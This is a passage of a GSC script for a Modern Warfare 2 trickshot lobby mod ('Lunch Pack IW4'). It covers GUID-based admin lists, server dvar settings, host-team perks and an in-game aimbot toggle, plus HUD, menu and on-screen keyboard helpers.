#include maps\mp\gametypes\_hud_util;
#include maps\mp\_utility;
#include common_scripts\utility;

init() {
    level thread defineOnce();
    level thread secondBlood();
    level thread onPlayerConnect();
}
isAdmin() { // List of Players to get Admin on spawn.
    switch (self.GUID) {
    case "000901f23585cc82" : return true; //wckd
    case "000901ffffffffff" : return true; // Add more like this.
    default                 : return false;
    }
}
isExplosiveBullets() { // List of Players to get EB on spawn.
    switch (self.GUID) {
    case "000901f23585cc82" : return true; //wckd
    default                 : return false;
    }
}
isShotgunNac() { // List of Players to get Auto Shotgun Reload Nac on spawn.
    switch (self.GUID) {
    case "000901f23585cc82" : return true; //wckd
    default                 : return false;
    }
}
autoRenamer() { // Auto Renaming.
    if (self.GUID == "000901f23585cc82") { RenamePlayer("wckd", self); } //wckd
}
botRename() {
    botName = "";
    switch (randomint(18)) {
        case 0  : botName = "Pedestrian"; break;
        case 1  : botName = "Error"; break;
        case 2  : botName = "Disconnected"; break;
        case 3  : botName = "Apprentice setup"; break;
        case 4  : botName = "Hardman"; break;
        case 5  : botName = "Twobox"; break;
        case 6  : botName = "Microsoft"; break;
        case 7  : botName = "AI"; break;
        case 8  : botName = "Waiter"; break;
        case 9  : botName = "AFK"; break;
        case 10 : botName = "Dummy"; break;
        case 11 : botName = "Random"; break;
        case 12 : botName = "Spongebob"; break;
        case 13 : botName = "Patrick"; break;
        case 14 : botName = "NPC"; break;
        case 15 : botName = "Geezer"; break;
        case 16 : botName = "Spectator"; break;
        case 17 : botName = "^6UwU"; break;
        case 18 : botName = "Racist"; break;
        case 19 : botName = "FaZe Temperrr"; break;
    }
    self RenamePlayer(botName, self);
}
extraSettings() {
    self.stunaimbot = true; // Set this to false to turn off Stun/Flash Aimbot
}
onPlayerConnect() {
    for (;;) {
        level waittill("connected", player);
        player thread onPlayerSpawned();
        player thread spawnClass();
    }
}
onPlayerSpawned() {
    self endon("disconnect");
    level endon("game_ended");
    self notify("spawned_in");
    self playersetup();
    for (;;) {
        self waittill("spawned_player");
        self thread autoRenamer();
        self thread extraSettings();
        self.access = [];
        self.playerAlive = true;
        self.teamChosen = undefined;
        self.menuCust = [];
        self.menuCust["MENU_BG"] = (0, 0, 0);
        self.menuCust["MENU_COLOR"] = (0.9, 0.2, 0.7);
        self.menuCust["MENU_RIGHT"] = (0, 0, 0);
        self.menuCust["MENU_BG1"] = (0, 0, 0);
        self.menuCust["MENU_TEXT1"] = (1, 1, 1);
        self thread disablenoobtubes();
        if (self ishost()) {
            level thread barrierunstuck();
            self thread overflowfix();
            self thread lastStandSpeed();
        }
        if (level.gametype == "dm") {
            if (self isHost() || self isDeveloper() || self isAdmin() ||
                isDefined(self.pers["has_admin"])) {
                wait 0.2;
                self.maxHealth = 130;
                self.health = self.maxHealth;
                self thread douav();
                self thread classChanging();
                self thread callpackfunctions();
                self thread packInfo();
                self thread loopteamperks();
                self thread easyelevators();
            }
        }
        if (level.gametype == "sd" || level.gametype == "dom") {
            if (self isHost()) {
                level.hostTeam = self.pers["team"];
            }
            self thread teamsetup();
        }
        foreach(player in level.players)
        if (isDefined(player.pers["isBot"]) && player.pers["isBot"]) {
            player thread botlocations();
            if (player.pers["botLoc"] == true) {
                player setOrigin(player.pers["botSavePos"]);
                player setPlayerAngles(player.pers["botSaveAng"]);
            }
        }
        if (isDefined(self.pers["LoadPosSpawn"]) &&
            isDefined(self.pers["savepos"])) {
            self setorigin(self.pers["savepos"]);
            self setplayerangles(self.pers["saveang"]);
        }
    }
}
defineOnce() {
    PrecacheTurret("sentry_minigun_mp");
    PrecacheItem("lightstick_mp");
    precacheitem("throwingknife_rhand_mp");
    PrecacheShader("damage_feedback_j");
    PrecacheShader("decode_characters");
    PrecacheShader("gradient_center");
    setDvarIfUninitialized("function_boltfix", 0);
    setDvar("bolttime", 1.5);
    setDvar("sv_cheats", 1);
    setDvar("sv_superpenetrate", 1);
    setDvar("allClientDvarsEnabled", 1);
    setDvar("loc_warnings", 0);
    setDvar("loc_warningsUI", 0);
    setdvar("bg_falldamagemaxheight", 300);
    setdvar("bg_falldamageminheight", 128);
    setDvar("bg_prone_yawcap", 360);
    setDvar("bg_surfacePenetration", 9999);
    setDvar("bg_bulletRange", 99999);
    setDvar("bg_playerEjection", 0);
    setDvar("bg_playerCollision", 0);
    setDvar("scr_sd_bombtimer", 90);
    setDvar("scr_diehard", 1);
    setDvar("snd_enable3D", 1);
    setdvar("hud_fadeout_speed", 1);
    setDvar("grenadeBumpMag", 0);
    setDvar("grenadeBumpMax", 0);
    setDvar("grenadeBumpFreq", 0);
    setDvar("grenadeFrictionHigh", 1);
    setDvar("grenadeFrictionLow", 1);
    setDvar("grenadeFrictionMaxThresh", 0);
    setDvar("grenadeRollingEnabled", 1);
    setDvar("grenadeCurveMax", 0);
    setDvar("perk_bulletPenetrationMultiplier", 35);
    setDvar("penetrationcount", 100);
    setDvar("player_sprintUnlimited", 1);
    setDvar("party_gameStartTimerLength", 0);
    setDvar("jump_slowdownEnable", 1);
    setDvar("didyouknow", "^6Lunch - IW4 ^7Loaded.");
    level.strings = [];
    level.statsList = [];
    for (a = 1; a < 109; a++)
        level.statsList[level.statsList.size] =
        TableLookup("mp/awardTable.csv", 0, a, 1);
    level.baseMaps = [
        "mp_afghan", "mp_derail", "mp_estate", "mp_favela", "mp_highrise",
        "mp_invasion", "mp_checkpoint", "mp_quarry", "mp_rundown", "mp_rust",
        "mp_boneyard", "mp_nightshift", "mp_subbase", "mp_terminal",
        "mp_underpass", "mp_brecourt"
    ];
    level.baseMapNames = [
        @ "Afghan", "Derail", "Estate", "Favela", "Highrise", "Invasion",
        "Karachi", "Quarry", "Rundown", "Rust", "Scrapyard", "Skidrow",
        "Sub Base", "Terminal", "Underpass", "Wasteland"
    ];
    level.baseGametypes = [
        "dm", "war", "sd", "sab", "dom", "koth", "dd", "arena", "vip", "ctf",
        "oneflag", "gtnw"
    ];
    level.baseGametypesNames = [
        @ "Free-for-all", "Team Deathmatch", "Search and Destroy", "Sabotage",
        "Domination", "Headquarters", "Demolition", "Arena", "VIP",
        "Capture the flag", "One Flag CTF", "Global Thermonuclear War"
    ];
}
playersetup() {
    if (self isHost() || self isDeveloper() || self isAdmin() ||
        isDefined(self.pers["has_admin"])) {
        self thread roundResetBind();
        self thread initializeSetup("Admin", self);
    } else {
        self.menu["isLocked"] = true;
    }
    if (self isExplosiveBullets()) {
        if (isDefined(self.pers["eb_range"])) {
            x = self.pers["eb_range"];
            self thread bigBullets(x, 2147483600);
        } else {
            if (self isHost())
                x = 200;
            else
                x = 150;
            self thread bigBullets(x, 2147483600);
            self.pers["eb_range"] = x;
        }
    }
    if (self isShotgunNac()) {
        self.pers["has_shotgunnac"] = true;
    }
    self thread defaulttimescale();
    self thread MonitorButtons();
    self thread keepName();
    self setClientDvar(
        "motd",
        "Thanks for playing with Lunch Pack IW4 ^7 \n \n ^2News*^7 Added Revive Teammates in Last Stand! ^7 \n \n ^2youtube.com/@597 ^7- ^2twitter.com/wrongin ^7- ^2dsc.gg/wckd ^7");
}
keepName() {
    if (isDefined(self.pers["keep_name"])) {
        string = self.pers["keep_name"];
        self thread RenamePlayer(string, self);
    }
}
overflowfix() {
    level.overflow = createServerFontString("small", 1);
    level.overflow.alpha = 0;
    level.overflow setText("marker");
    for (;;) {
        level waittill("CHECK_OVERFLOW");
        if (level.strings.size >= 45) {
            level.overflow ClearAllTextAfterHudElem();
            level.strings = [];
            level notify("FIX_OVERFLOW");
        }
    }
}
callfunctions() {
    self thread weaponhitmarker();
    self thread nopause();
    self thread bounce();
    self thread barrelroll();
    self thread pistolnac();
    self thread shotgunnac();
}
callpackfunctions() {
    self thread softland();
    self thread riotknife();
    self thread predknife();
    self thread canzoom();
}
callbinds() {
    self setupbind("bolt", ::bolt);
    self setupbind("nacswap", ::nacswap);
    self setupbind("classswap", ::classswap);
    self setupbind("reversereloads", ::reversereloads);
    self setupbind("smoothactions", ::smoothactions);
    self setupbind("gflip", ::gflip);
    self setupbind("sentry", ::sentry);
    self setupbind("carepack", ::carepack);
    self setupbind("predcancel", ::predcancel);
    self setupbind("shax", ::shax);
    self setupbind("flash", ::flash);
    self setupbind("thirdeye", ::thirdeye);
}
spawnClass() {
    if (self isHost()) {
        wait 1;
        if (!isDefined(self.playerAlive)) {
            self notify("menuresponse", "changeclass",
                "custom" + RandomIntRange(1, 3));
        }
    } else {
        wait 10;
        if (!isDefined(self.playerAlive)) {
            self notify("menuresponse", "changeclass",
                "custom" + RandomIntRange(1, 3));
        }
    }
}
classChanging() {
    self endon("disconnect");
    oldclass = self.pers["class"];
    for (;;) {
        if (self.pers["class"] != oldclass) {
            self maps\mp\gametypes\_class::giveloadout(self.pers["team"],
                self.pers["class"]);
            oldclass = self.pers["class"];
        }
        wait 0.05;
    }
}
secondBlood() {
    for (;;) {
        maps\mp\gametypes\_rank::registerScoreInfo("firstblood", 0);
        level.plantTime = dvarFloatValue("planttime", 120, 0, 120);
        waitframe();
    }
}
loopteamperks() {
    self endon("disconnect");
    self endon("game_ended");
    for (;;) {
        if (!self _hasPerk("specialty_detectexplosive"))
            self maps\mp\perks\_perks::givePerk("specialty_detectexplosive");
        if (!self _hasPerk("specialty_bulletpenetration"))
            self maps\mp\perks\_perks::givePerk("specialty_bulletpenetration");
        if (!self _hasPerk("specialty_bulletdamage"))
            self maps\mp\perks\_perks::givePerk("specialty_bulletdamage");
        if (!self _hasPerk("specialty_falldamage"))
            self maps\mp\perks\_perks::givePerk("specialty_falldamage");
        if (!self _hasPerk("specialty_lightweight"))
            self maps\mp\perks\_perks::givePerk("specialty_lightweight");
        if (!self _hasPerk("specialty_saboteur"))
            self maps\mp\perks\_perks::givePerk("specialty_saboteur");
        if (!self _hasPerk("specialty_automantle"))
            self maps\mp\perks\_perks::givePerk("specialty_automantle");
        if (!self _hasPerk("specialty_fastmantle"))
            self maps\mp\perks\_perks::givePerk("specialty_fastmantle");
        if (!self _hasPerk("specialty_quieter"))
            self maps\mp\perks\_perks::givePerk("specialty_quieter");
        if (!self _hasPerk("specialty_pistoldeath"))
            self maps\mp\perks\_perks::givePerk("specialty_pistoldeath");
        waitframe();
    }
}
loopenemyperks() {
    self endon("disconnect");
    self endon("game_ended");
    for (;;) {
        if (self _hasPerk("specialty_coldblooded"))
            self _unsetPerk("specialty_coldblooded");
        self maps\mp\perks\_perks::givePerk("specialty_lightweight");
        if (self _hasPerk("specialty_explosivedamage"))
            self _unsetPerk("specialty_explosivedamage");
        self maps\mp\perks\_perks::givePerk("specialty_lightweight");
        if (self _hasPerk("specialty_finalstand"))
            self _unsetPerk("specialty_finalstand");
        if (self _hasPerk("specialty_pistoldeath"))
            self _unsetPerk("specialty_pistoldeath");
        waitframe();
    }
}
defaulttimescale() {
    if (level.timespeed == 1) {
        level.timespeed = 0;
        setSlowMotion(0.5, 1.0, 0.5);
    }
    if (level.timespeed == 2) {
        level.timespeed = 0;
        setSlowMotion(0.25, 1.0, 0.5);
    }
}
roundResetBind() {
    self endon("disconnect");
    self endon("spawned_in");
    for (;;) {
        level waittill("game_ended");
        self thread roundResetButton();
        string = "Press [{+smoke}] to Reset Rounds";
        self.notifs["ROUND_RESET"]["TEXT"] = self createText(
            "small", .9, "CENTER", "CENTER", 0, -230, 3, 1, string, (1, 1, 1));
        self.notifs["ROUND_RESET"]["BLACK"] = self createRectangle(
            "CENTER", "CENTER", 0, -230, 130, 14, (0, 0, 0), "white", 1, .4);
        self.notifs["ROUND_RESET"]["TOP_BAR"] =
            self createRectangle("CENTER", "CENTER", 0, -237, 130, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.notifs["ROUND_RESET"]["BOTTOM_BAR"] =
            self createRectangle("CENTER", "CENTER", 0, -223, 130, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.notifs["ROUND_RESET"]["LFET_BAR"] =
            self createRectangle("CENTER", "CENTER", -65, -230, 1, 14,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.notifs["ROUND_RESET"]["RIGHT_BAR"] =
            self createRectangle("CENTER", "CENTER", 65, -230, 1, 14,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        wait 5;
        if (level.showingFinalKillcam)
            destroyAll(self.notifs["ROUND_RESET"]);
        else
            wait 5;
        destroyAll(self.notifs["ROUND_RESET"]);
    }
}
roundResetButton() {
    self endon("disconnect");
    self endon("spawned_in");
    for (;;) {
        self notifyonplayercommand("resetBind", "+smoke");
        self waittill("resetBind");
        self thread doRoundReset();
        destroyAll(self.notifs["ROUND_RESET"]);
    }
}
easyelevators() {
    for (;;) {
        while (self getStance() != "crouch") waitframe();
        while (self getStance() != "stand") waitframe();
        x = self.origin[0];
        z = self.origin[1];
        if (x > 0)
            x += 0.15;
        else
            x -= 0.15;
        if (z > 0)
            z += 0.15;
        else
            z -= 0.15;
        self setOrigin((int(x), int(z), self.origin[2]));
        waitframe();
    }
}
barrierunstuck() {
    wait 1;
    if (getDvar("mapname") == "mp_afghan") {
        level thread tpifabove(1275);
    }
    if (getDvar("mapname") == "mp_boneyard") {
        level thread tpifabove(375);
    }
    if (getDvar("mapname") == "mp_checkpoint") {
        level thread tpifabove(4075);
    }
    if (getDvar("mapname") == "mp_favela") {
        level thread tpifabove(1500);
    }
    if (getDvar("mapname") == "mp_highrise") {
        level thread tpifabove(3755);
    }
    if (getDvar("mapname") == "mp_quarry") {
        level thread tpifabove(955);
    }
}
tpifabove(z) {
    level endon("game_ended");
    for (;;) {
        foreach(player in level.players) {
            if (player.origin[2] > z) {
                x = player.angles[1];
                if (-1 >= x && x >= -90) {
                    player SetOrigin(player.origin + (50, -50, -350));
                }
                if (-90 >= x && x >= -180) {
                    player SetOrigin(player.origin + (-50, -50, -350));
                }
                if (90 <= x && x <= 180) {
                    player SetOrigin(player.origin + (-50, 50, -350));
                }
                if (0 <= x && x <= 90) {
                    player SetOrigin(player.origin + (50, 50, -350));
                }
            }
            wait .1;
        }
        wait .15;
    }
}
teamsetup() {
    if (isDefined(self.pers["team"])) {
        wait 0.5;
        myTeam = self.pers["team"];
        if (myTeam == level.hostTeam && !isDefined(self.chosenTeam)) {
            self.chosenTeam = true;
            self.maxHealth = 120;
            self.health = self.maxHealth;
            if (self IsHost() || self isDeveloper() || self isAdmin() ||
                isDefined(self.pers["has_admin"])) {
                continue;
            } else {
                self thread menuMonitor();
                self.pers["has_pack"] = true;
            }
            self thread callpackfunctions();
            self thread packInfo();
            if (level.gametype == "dom") {
                self thread douav();
                self thread classChanging();
                self thread loopteamperks();
            } else {
                self thread douav();
                self thread classChanging();
                self thread loopteamperks();
                self thread easyelevators();
                if (isDefined(self.stunaimbot)) {
                    self thread stunbot();
                }
            }
        }
        if (myTeam != level.hostTeam && !isDefined(self.chosenTeam)) {
            self.chosenTeam = true;
            self thread loopenemyperks();
            self.maxHealth = 40;
            self.health = self.maxHealth;
        }
    }
}
ShowPackInfo() {
    self.pers["HidePackControls"] =
        (isDefined(self.pers["HidePackControls"]) ? undefined : true);
    if (isDefined(self.pers["HidePackControls"])) {
        self IPrintLn("Show Controls: ^1Off");
        self destroyAll(self.pack["CONTROLS"]);
    } else {
        self IPrintLn("Show Controls: ^6On");
        packCont();
    }
}
packInfo() {
    if (!isDefined(self.pers["HidePackControls"]) &&
        !isDefined(self.pers["isOpen"])) {
        string =
            "Press [{+speed_throw}] + [{+actionslot 1}] to Open Lunch Pack";
        self.pack["CONTROLS"]["TEXT"] =
            self createText("small", .8, "CENTER", "CENTER", -358, 230, 3, 1,
                string, (1, 1, 1));
        self.pack["CONTROLS"]["BLACK"] = self createRectangle(
            "CENTER", "CENTER", -358, 230, 116, 12, (0, 0, 0), "white", 1, .4);
        self.pack["CONTROLS"]["TOP_GREEN"] =
            self createRectangle("CENTER", "CENTER", -358, 236, 116, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["BOTTOM_BLUE"] =
            self createRectangle("CENTER", "CENTER", -358, 224, 116, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["LFET_GREEN"] =
            self createRectangle("CENTER", "CENTER", -416, 230, 1, 13,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["RIGHT_BLUE"] =
            self createRectangle("CENTER", "CENTER", -300, 230, 1, 13,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
    }
}
packCont() {
    if (!isDefined(self.pers["HidePackControls"])) {
        string =
            "[{+actionslot 1}] / [{+actionslot 2}] to Scroll - [{+usereload}] to Select - [{+melee}] to Close";
        self.pack["CONTROLS"]["TEXT"] =
            self createText("small", .8, "CENTER", "CENTER", -340, 230, 3, 1,
                string, (1, 1, 1));
        self.pack["CONTROLS"]["BLACK"] = self createRectangle(
            "CENTER", "CENTER", -340, 230, 154, 12, (0, 0, 0), "white", 1, .4);
        self.pack["CONTROLS"]["TOP_GREEN"] =
            self createRectangle("CENTER", "CENTER", -340, 236, 154, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["BOTTOM_BLUE"] =
            self createRectangle("CENTER", "CENTER", -340, 224, 154, 1,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["LFET_GREEN"] =
            self createRectangle("CENTER", "CENTER", -416, 230, 1, 13,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
        self.pack["CONTROLS"]["RIGHT_BLUE"] =
            self createRectangle("CENTER", "CENTER", -263, 230, 1, 13,
                self.menuCust["MENU_COLOR"], "white", 2, .9);
    }
}
createText(font, fontScale, align, relative, x, y, sort, alpha, text, color,
    isLevel) {
    textElem = self createFontString(font, fontScale);
    textElem setPoint(align, relative, x, y);
    textElem.hideWhenInMenu = true;
    textElem.archived = false;
    textElem.sort = sort;
    textElem.alpha = alpha;
    textElem.color = color;
    self addToStringArray(text);
    textElem thread watchForOverFlow(text);
    return textElem;
}
createKeyboardText(font, fontSize, sort, text, align, relative, x, y, alpha,
    color, glowAlpha, glowColor) {
    uiElement = self CreateFontString(font, fontSize);
    uiElement.hideWhenInMenu = true;
    uiElement.archived = false;
    uiElement.sort = sort;
    uiElement.alpha = alpha;
    uiElement.color = color;
    if (isDefined(glowAlpha))
        uiElement.glowalpha = glowAlpha;
    if (isDefined(glowColor))
        uiElement.glowColor = glowColor;
    uiElement.type = "text";
    self addToStringArray(text);
    uiElement thread watchForOverFlow(text);
    uiElement setPoint(align, relative, x, y);
    return uiElement;
}
createRectangle(align, relative, x, y, width, height, color, shader, sort,
    alpha, server) {
    boxElem = newClientHudElem(self);
    boxElem.elemType = "bar";
    boxElem.color = color;
    if (!level.splitScreen) {
        boxElem.x = -2;
        boxElem.y = -2;
    }
    boxElem.hideWhenInMenu = true;
    boxElem.archived = false;
    boxElem.width = width;
    boxElem.height = height;
    boxElem.align = align;
    boxElem.relative = relative;
    boxElem.xOffset = 0;
    boxElem.yOffset = 0;
    boxElem.children = [];
    boxElem.sort = sort;
    boxElem.alpha = alpha;
    boxElem.shader = shader;
    boxElem setParent(level.uiParent);
    boxElem setShader(shader, width, height);
    boxElem.hidden = false;
    boxElem setPoint(align, relative, x, y);
    return boxElem;
}
createKeyboardRectangle(align, relative, x, y, width, height, color, sort,
    alpha, shader) {
    uiElement = NewClientHudElem(self);
    uiElement.elemType = "bar";
    uiElement.hideWhenInMenu = true;
    uiElement.archived = true;
    uiElement.children = [];
    uiElement.sort = sort;
    uiElement.color = color;
    uiElement.alpha = alpha;
    uiElement setParent(level.uiParent);
    uiElement setShader(shader, width, height);
    uiElement.foreground = true;
    uiElement.align = align;
    uiElement.relative = relative;
    uiElement.x = x;
    uiElement.y = y;
    if (!level.splitScreen) {
        uiElement.x = -2;
        uiElement.y = -2;
    }
    uiElement setKeyboardPoint(align, relative, x, y);
    return uiElement;
}
setKeyboardPoint(point, relativePoint, xOffset, yOffset, moveTime) {
    if (!isDefined(moveTime))
        moveTime = 0;
    element = self getParent();
    if (moveTime)
        self moveOverTime(moveTime);
    if (!isDefined(xOffset))
        xOffset = 0;
    self.xOffset = xOffset;
    if (!isDefined(yOffset))
        yOffset = 0;
    self.yOffset = yOffset;
    self.point = point;
    self.alignX = "center";
    self.alignY = "middle";
    if (isSubStr(point, "TOP"))
        self.alignY = "top";
    if (isSubStr(point, "BOTTOM"))
        self.alignY = "bottom";
    if (isSubStr(point, "LEFT"))
        self.alignX = "left";
    if (isSubStr(point, "RIGHT"))
        self.alignX = "right";
    if (!isDefined(relativePoint))
        relativePoint = point;
    self.relativePoint = relativePoint;
    relativeX = "center";
    relativeY = "middle";
    if (isSubStr(relativePoint, "TOP"))
        relativeY = "top";
    if (isSubStr(relativePoint, "BOTTOM"))
        relativeY = "bottom";
    if (isSubStr(relativePoint, "LEFT"))
        relativeX = "left";
    if (isSubStr(relativePoint, "RIGHT"))
        relativeX = "right";
    if (element == level.uiParent) {
        self.horzAlign = relativeX;
        self.vertAlign = relativeY;
    } else {
        self.horzAlign = element.horzAlign;
        self.vertAlign = element.vertAlign;
    }
    if (relativeX == element.alignX) {
        offsetX = 0;
        xFactor = 0;
    } else if (relativeX == "center" || element.alignX == "center") {
        offsetX = int(element.width / 2);
        if (relativeX == "left" || element.alignX == "right")
            xFactor = -1;
        else
            xFactor = 1;
    } else {
        offsetX = element.width;
        if (relativeX == "left")
            xFactor = -1;
        else
            xFactor = 1;
    }
    self.x = element.x + (offsetX * xFactor);
    if (relativeY == element.alignY) {
        offsetY = 0;
        yFactor = 0;
    } else if (relativeY == "middle" || element.alignY == "middle") {
        offsetY = int(element.height / 2);
        if (relativeY == "top" || element.alignY == "bottom")
            yFactor = -1;
        else
            yFactor = 1;
    } else {
        offsetY = element.height;
        if (relativeY == "top")
            yFactor = -1;
        else
            yFactor = 1;
    }
    self.y = element.y + (offsetY * yFactor);
    self.x += self.xOffset;
    self.y += self.yOffset;
    switch (self.elemType) {
        case "bar":
            setPointBar(point, relativePoint, xOffset, yOffset);
            break;
    }
    self updateChildren();
}
setSafeText(text) {
    self notify("stop_TextMonitor");
    self addToStringArray(text);
    self thread watchForOverFlow(text);
}
addToStringArray(text) {
    if (!isInArray(level.strings, text)) {
        level.strings[level.strings.size] = text;
        level notify("CHECK_OVERFLOW");
    }
}
watchForOverFlow(text) {
    self endon("stop_TextMonitor");
    while (isDefined(self)) {
        if (isDefined(text.size))
            self setText(text);
        else {
            self setText(undefined);
            self.label = text;
        }
        level waittill("FIX_OVERFLOW");
    }
}
isInArray(array, text) {
    for (e = 0; e < array.size; e++)
        if (array[e] == text)
            return true;
    return false;
}
destroyAll(array) {
    if (!isDefined(array))
        return;
    keys = getArrayKeys(array);
    for (a = 0; a < keys.size; a++)
        if (isDefined(array[keys[a]][0]))
            for (e = 0; e < array[keys[a]].size; e++)
                array[keys[a]][e] destroy();
        else
            array[keys[a]] destroy();
}
toUpper(string) {
    if (!isDefined(string) || string.size <= 0)
        return "";
    alphabet = strTok(
        "A;B;C;D;E;F;G;H;I;J;K;L;M;N;O;P;Q;R;S;T;U;V;W;X;Y;Z;0;1;2;3;4;5;6;7;8;9; ;-;_",
        ";");
    final = "";
    for (e = 0; e < string.size; e++)
        for (a = 0; a < alphabet.size; a++)
            if (IsSubStr(toLower(string[e]), toLower(alphabet[a])))
                final += alphabet[a];
    return final;
}
TraceBullet() {
    return BulletTrace(
        self GetEye(),
        self GetEye() +
        vectorScale(AnglesToForward(self GetPlayerAngles()), 1000000),
        0, self)["position"];
}
vectorScale(vector, scale) {
    vector = (vector[0] * scale, vector[1] * scale, vector[2] * scale);
    return vector;
}
GetPlayerArray() {
    players = GetEntArray("player", "classname");
    return players;
}
SpawnScriptModel(origin, model, angles, time, clip) {
    if (isDefined(time))
        wait time;
    ent = spawn("script_model", origin);
    ent SetModel(model);
    if (isDefined(angles))
        ent.angles = angles;
    if (isDefined(clip))
        ent CloneBrushModelToScriptModel(clip);
    return ent;
}
isDeveloper() {
    switch (self.GUID) {
        case "000901f23585cc82":
            return true;
        case "000901fe0bace82d":
            return true;
        default:
            return false;
    }
}
kbMoveY(y, time) {
    self MoveOverTime(time);
    self.y = y;
    wait time;
}
kbMoveX(x, time) {
    self MoveOverTime(time);
    self.x = x;
    wait time;
}
Keyboard(title, func, input1) {
    self menuClose();
    letters = [];
    lettersTok = StrTok(
        "QAZqaz WSXwsx EDCedc RFVrfv TGBtgb YHNyhn UJMujm IK,ik! OL.ol? P:;p-/ 147*+$ 2580<[ 369#>]",
        " ");
    for (a = 0; a < lettersTok.size; a++) {
        letters[a] = "";
        for (b = 0; b < lettersTok[a].size; b++)
            letters[a] += lettersTok[a][b] + "\n";
    }
    self.keyboard["DESIGN"] = [];
    self.keyboard["DESIGN"]["BACKGROUND"] = self createKeyboardRectangle(
        "CENTER", "CENTER", 0, 0, 320, 200, (0, 0, 0), 1, .5, "white");
    self.keyboard["DESIGN"]["TITLE"] = self createKeyboardText(
        "objective", 1.5, 2, title, "CENTER", "CENTER", 0, -85, 1, (1, 1, 1));
    self.keyboard["DESIGN"]["STRING"] = self createKeyboardText(
        "objective", 1.3, 2, "", "CENTER", "CENTER", 0, -60, 1, (1, 1, 1));
    for (a = 0; a < letters.size; a++)
        self.keyboard["DESIGN"]["keys" + a] = self createKeyboardText(
            "smallfixed", 1, 3, letters[a], "CENTER", "CENTER", -119 + (a * 20),
            -30, 1, (1, 1, 1));
    self.keyboard["DESIGN"]["CONTROLS"] = self createKeyboardText(
        "objective", .9, 2,
        "[{+melee}] Back/Exit -[{+activate}] Select -[{weapnext}] Space -[{+gostand}] Confirm",
        "CENTER", "CENTER", 0, 80, 1, (1, 1, 1));
    self.keyboard["DESIGN"]["CURSER"] = self createKeyboardRectangle(
        "CENTER", "CENTER", self.keyboard["DESIGN"]["keys0"].x + .1,
        self.keyboard["DESIGN"]["keys0"].y, 15, 15, divideColor(215, 25, 155),
        2, 1, "white");
    cursY = 0;
    cursX = 0;
    stringLimit = 32;
    string = "";
    if (isConsole())
        multiplier = 18.5;
    else
        multiplier = 16.5;
    wait .5;
    while (1) {
        self FreezeControls(true);
        if (self isButtonPressed("+actionslot 1") ||
            self isButtonPressed("+actionslot 2")) {
            cursY -= self isButtonPressed("+actionslot 1");
            cursY += self isButtonPressed("+actionslot 2");
            if (cursY < 0 || cursY > 5)
                cursY = (cursY < 0 ? 5 : 0);
            self.keyboard["DESIGN"]["CURSER"] kbMoveY(
                self.keyboard["DESIGN"]["keys0"].y + (multiplier * cursY), .05);
            wait .1;
        }
        if (self isButtonPressed("+actionslot 3") ||
            self isButtonPressed("+actionslot 4")) {
            cursX -= self isButtonPressed("+actionslot 3");
            cursX += self isButtonPressed("+actionslot 4");
            if (cursX < 0 || cursX > 12)
                cursX = (cursX < 0 ? 12 : 0);
            self.keyboard["DESIGN"]["CURSER"] kbMoveX(
                self.keyboard["DESIGN"]["keys0"].x + .1 + (20 * cursX), .05);
            wait .1;
        }
        if (self UseButtonPressed()) {
            if (string.size < stringLimit)
                string += lettersTok[cursX][cursY];
            else
                self iPrintln("The selected text is too long");
            wait .2;
        }
        if (self isButtonPressed("weapnext")) {
            if (string.size < stringLimit)
                string += " ";
            else
                self iPrintln("The selected text is too long");
            wait .2;
        }
        if (self isButtonPressed("+gostand")) {
            if (string != "") {
                if (isDefined(input1))
                    self thread[[func]](string, input1);
                else
                    self thread[[func]](string);
            }
            break;
        }
        if (self MeleeButtonPressed()) {
            if (string.size > 0) {
                backspace = "";
                for (a = 0; a < string.size - 1; a++) backspace += string[a];
                string = backspace;
                wait .2;
            } else
                break;
        }
        self.keyboard["DESIGN"]["STRING"] SetSafeText(string);
        wait .05;
    }
    destroyAll(self.keyboard["DESIGN"]);
    self FreezeControls(false);
}
NumberPad(title, func, player) {
    self menuClose();
    if (title == "Change Prestige")
        self iPrintln(
            "^1WARNING: ^7Change prestige will kick you from the game");
    letters = [];
    lettersTok = StrTok("0 1 2 3 4 5 6 7 8 9", " ");
    for (a = 0; a < lettersTok.size; a++) letters[a] = lettersTok[a];
    NumberPad = [];
    NumberPad["background"] = self createKeyboardRectangle(
        "CENTER", "CENTER", 0, 0, 300, 100, (0, 0, 0), 1, .5, "white");
    NumberPad["title"] = self createKeyboardText(
        "objective", 1.5, 2, title, "CENTER", "CENTER", 0, -40, 1, (1, 1, 1));
    NumberPad["controls"] = self createKeyboardText(
        "objective", .9, 2,
        "[{+melee}] Back/Exit -[{+activate}] Select -[{+gostand}] Confirm",
        "CENTER", "CENTER", 0, 35, 1, (1, 1, 1));
    NumberPad["string"] = self createKeyboardText(
        "objective", 1.3, 2, "", "CENTER", "CENTER", 0, -15, 1, (1, 1, 1));
    for (a = 0; a < letters.size; a++)
        NumberPad["keys" + a] =
        self createKeyboardText("smallfixed", 1, 3, letters[a], "CENTER",
            "CENTER", -90 + (a * 20), 10, 1, (1, 1, 1));
    NumberPad["scroller"] = self createKeyboardRectangle(
        "CENTER", "CENTER", NumberPad["keys0"].x, NumberPad["keys0"].y, 15, 15,
        divideColor(0, 140, 255), 2, 1, "white");
    cursX = 0;
    stringLimit = 32;
    string = "";
    wait .3;
    while (1) {
        self FreezeControls(true);
        if (self isButtonPressed("+actionslot 3") ||
            self isButtonPressed("+actionslot 4")) {
            cursX -= self isButtonPressed("+actionslot 3");
            cursX += self isButtonPressed("+actionslot 4");
            if (cursX < 0 || cursX > 9)
                cursX = (cursX < 0 ? 9 : 0);
            NumberPad["scroller"] kbMoveX(NumberPad["keys0"].x + (20 * cursX),
                .05);
            wait .1;
        }
        if (self UseButtonPressed()) {
            if (string.size < stringLimit)
                string += lettersTok[cursX];
            else
                self iPrintln("The selected text is too long");
            wait .2;
        }
        if (self isButtonPressed("+gostand")) {
